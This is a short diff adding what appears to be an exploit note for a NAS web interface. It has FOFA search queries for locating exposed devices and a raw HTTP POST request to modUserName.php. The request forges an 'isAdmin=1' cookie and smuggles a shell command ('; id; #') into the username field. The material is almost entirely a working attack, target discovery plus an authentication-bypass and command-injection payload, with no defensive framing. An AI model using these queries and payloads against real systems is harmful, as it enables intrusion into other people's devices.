@@ -1,0 +1,12 @@
+fofa:icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
+
+body="_PROJECT_MODEL_ID_YOSEMITE " && body="_PROJECT_MODEL_ID_LIGHTNING "
+
+
+
+POST /web/php/modUserName.php HTTP/1.1
+Host: west.nas.mrxn.net
+Cookie: username=test; isAdmin=1
+Content-Type: application/x-www-form-urlencoded
+
+oldName=someuser&username=newuser"; id; #
